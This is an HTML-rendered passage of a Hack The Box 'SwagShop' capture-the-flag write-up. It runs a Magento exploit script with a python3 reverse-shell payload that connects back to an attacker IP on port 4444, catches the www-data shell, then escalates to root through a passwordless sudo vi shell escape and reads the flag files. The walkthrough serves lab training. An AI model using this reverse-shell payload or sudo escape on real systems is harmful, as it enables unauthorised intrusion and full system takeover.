</span><span class="gp">$</span><span class="w"> </span>python 37811.py http://10.10.10.140/index.php/admin <span class="s2">"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s2">10.10.14.16</span><span class="se">\"</span><span class="s2">,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span>
</code></pre></div>    </div>
    <blockquote>
      <p>There seems to be no <strong><code class="highlighter-rouge">python2</code></strong> inside the box but at least, there is <strong><code class="highlighter-rouge">python3</code></strong>.</p>
    </blockquote>
  </li>
  <li>Going back to the listener:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  10.10.10.140: inverse host lookup failed: Unknown host
  connect to [10.10.14.16] from (UNKNOWN) [10.10.10.140] 40060
</span><span class="gp">  /bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-nopr</span>
<span class="go">  swagshop 4.4.0-146-generic x86_64 GNU/Linux

</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span> 
<span class="go">  uid=33(www-data) gid=33(www-data) groups=33(www-data)

</span><span class="gp">$</span><span class="w"> </span>python <span class="nt">-h</span>
<span class="go">  /bin/sh: 9: python: not found
</span></code></pre></div>    </div>
  </li>
</ol>

<hr />

<h2 id="part-5--privilege-escalation-www-data---root">PART 5 : PRIVILEGE ESCALATION (www-data -&gt; root)</h2>

<ol>
  <li>Check for commands that could be executed with <strong><code class="highlighter-rouge">sudo</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">  Matching Defaults entries for www-data on swagshop:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
     
  User www-data may run the following commands on swagshop:
      (root) NOPASSWD: /usr/bin/vi /var/www/html/*
</span></code></pre></div>    </div>
  </li>
  <li>Run <strong><code class="highlighter-rouge">python3</code></strong>â€™s <strong>pty</strong> module:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div>    </div>
  </li>
  <li>Run <strong><code class="highlighter-rouge">/usr/bin/vi</code></strong> using <strong><code class="highlighter-rouge">sudo</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/vi /var/www/html/ggwp
</code></pre></div>    </div>
  </li>
  <li>Execute commands while inside vim:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">~
~
~
~ 
~
~
~
~
:!/bin/bash
</span></code></pre></div>    </div>
  </li>
  <li>Now having a <strong>root</strong> shell:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /home/<span class="k">*</span>/user.txt
<span class="go">  a448........................bac8

</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">  c2b0........................6721

     ___ ___
   /| |/|\| |\
  /_| Â´ |.` |_\           We are open! (Almost)
    |   |.  |
    |   |.  |         Join the beta HTB Swag Store!
    |___|.__|       https://hackthebox.store/password
     
                     PS: Use root flag as password!
</span></code></pre></div>    </div>
  </li>
</ol>
:ET